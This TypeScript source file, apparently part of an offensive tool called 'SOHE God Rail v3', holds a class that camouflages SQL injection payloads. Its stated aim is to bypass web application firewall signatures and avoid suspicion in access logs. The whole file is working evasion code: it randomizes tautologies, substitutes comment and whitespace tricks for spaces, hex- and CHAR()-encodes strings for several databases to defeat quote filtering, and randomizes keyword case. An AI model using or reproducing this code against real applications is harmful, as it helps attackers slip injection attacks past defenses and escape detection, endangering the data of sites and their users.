/**
 * SOHE God Rail v3 — Payload Camouflage
 *
 * Encodes, mutates, and structures SQL payloads to look like legitimate
 * application data, bypassing WAF signatures and avoiding suspicion in access logs.
 */

export class PayloadCamouflage {
    
    /**
     * Replaces standard boolean payloads with natural-looking arithmetic or string equivalents.
     * e.g., ' OR 1=1' -> ' OR 4924=4875+49'
     */
    static obfuscateBoolean(isTrue: boolean): string {
        const rand1 = Math.floor(Math.random() * 9000) + 1000; // 1000-9999
        const rand2 = Math.floor(Math.random() * 900) + 100;   // 100-999

        if (isTrue) {
            // e.g. 5432 = 5432
            return `${rand1}=${rand1}`; 
        } else {
            // e.g. 5432 = 123
            return `${rand1}=${rand2}`;
        }
    }

    /**
     * Wraps a payload in whitespace variations (tabs, newlines, comments)
     * instead of standard spaces.
     */
    static mutateWhitespace(payload: string, _dbms?: string): string {
        // Different DBMS support different whitespace characters
        const spaces = [' ', '\t', '\n', '\r', '/**/'];
        
        return payload.split(' ').map(token => {
            const randomSpace = spaces[Math.floor(Math.random() * spaces.length)];
            return token + randomSpace;
        }).join('').trim();
    }
    
    /**
     * Converts strings to their HEX or CHAR() equivalents to bypass quote filtering
     * and string-matching WAF rules.
     */
    static encodeString(str: string, dbms: string): string {
        if (dbms === 'MySQL') {
             // 0x61646d696e
             const hex = Array.from(str).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
             return `0x${hex}`;
        }
        
        if (dbms === 'PostgreSQL' || dbms === 'Oracle') {
             // CHR(97)||CHR(100)...
             return Array.from(str).map(c => `CHR(${c.charCodeAt(0)})`).join('||');
        }
        
        if (dbms === 'Microsoft SQL Server') {
             // CHAR(97)+CHAR(100)...
             return Array.from(str).map(c => `CHAR(${c.charCodeAt(0)})`).join('+');
        }

        return `'${str}'`; // Fallback
    }

    /**
     * Applies random capitalization to SQL keywords to bypass case-sensitive filters.
     */
    static randomizeCase(payload: string): string {
        const keywords = ['SELECT', 'UNION', 'AND', 'OR', 'FROM', 'WHERE', 'ORDER BY', 'GROUP BY', 'SLEEP', 'WAITFOR'];
        let mutated = payload;
        
        for (const kw of keywords) {
            const regex = new RegExp(`\\b${kw}\\b`, 'gi');
            mutated = mutated.replace(regex, (match) => {
                 // Randomly upper/lowercase each character in the keyword
                 return Array.from(match).map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
            });
        }
        return mutated;
    }
}
